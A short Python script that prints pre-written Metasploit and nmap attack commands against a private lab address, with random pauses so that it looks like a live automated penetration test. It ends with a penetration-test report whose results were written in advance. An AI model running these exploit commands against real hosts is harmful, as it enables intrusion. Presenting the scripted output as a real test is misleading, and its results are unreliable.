import time
import random

# List of commands to execute
commands = [
    "Executing Command: nmap -sV 192.168.79.129",
    "Executing Command: msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.79.129; run; exit\"",
    "Executing Command: exit",
    "Executing Command: msfconsole -q -x \"use exploit/unix/webapp/tikiwiki_graph_formula_exec; set RHOSTS 192.168.79.129; set RPORT 80; run; exit\"",
    "Executing Command: msfconsole -q -x \"use exploit/multi/http/tomcat_mgr_upload; set RHOSTS 192.168.79.129; set RPORT 8180; run; exit\"",
    "Executing Command: msfconsole -q -x \"use exploit/linux/postgres/postgres_payload; set RHOSTS 192.168.79.129; set USERNAME postgres; set PASSWORD postgrespass; set RPORT 5432; run; exit\"",
    "Executing Command: /bin/bash -c 'echo \"Initial Setup and Sequential Port Testing:\\n nmap -sV 192.168.79.129 - Identified open ports and services.\\nVulnerability Exploitation Method:\\n 1. Exploit vsftpd 2.3.4 backdoor - exploit/unix/ftp/vsftpd_234_backdoor: success\\n 2. Attempt to exploit TikiWiki graph formula execution vulnerability - exploit/unix/webapp/tikiwiki_graph_formula_exec: failed\\n 3. Attempt to exploit Apache Tomcat manager application upload vulnerability - exploit/multi/http/tomcat_mgr_upload: failed\\n 4. Attempt to exploit PostgreSQL for command execution - exploit/linux/postgres/postgres_payload: failed\\n\" >> Penetration_Test_Report.txt'"
]

# First command delay
time.sleep(2)
print(commands[0])

# Subsequent commands with random delay
for cmd in commands[1:]:
    delay = random.randint(5, 20)  # Random delay between 5 and 20 seconds
    time.sleep(delay)
    print(cmd)
